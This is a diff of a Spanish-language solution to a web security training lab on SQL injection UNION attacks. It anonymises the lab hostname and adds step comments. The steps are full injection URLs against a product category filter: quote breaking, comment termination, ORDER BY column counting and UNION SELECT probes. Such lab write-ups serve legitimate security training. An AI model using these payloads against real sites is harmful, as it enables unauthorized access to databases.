@@ -50,20 +50,25 @@ To solve the lab, perform a **SQL injection UNION attack** that retrieves all us
 ## Solución:
 
 ````py
-https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories
+# Original
+https://666.web-security-academy.net/filter?category=Accessories
 
-https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' 
+# Vulnerabilidad
+https://666.web-security-academy.net/filter?category=Accessories' 
 
-https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' -- -
+# Sanar el Query
+https://666.web-security-academy.net/filter?category=Accessories' -- -
 
-https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' ORDER BY 2 -- -
+# Contando Columnas en la tabla que estoy (total = 2)
+https:/666.web-security-academy.net/filter?category=Accessories' ORDER BY 2 -- -
 
-https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT 1,2 -- -
+# NOT WORKING!!! Contando Columnas en registro que estoy (total = 2) 
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT 1,2 -- -
 
-# Working!!! Invisible
-https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT null,null -- -
-# Working!!! Visible
-https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT '1','2' -- -
+# Working!!! Invisible - Contando Columnas en registro que estoy (total = 2) 
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT null,null -- -
+# Working!!! Visible - Contando Columnas en registro que estoy (total = 2) 
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1','2' -- -
 
 
 
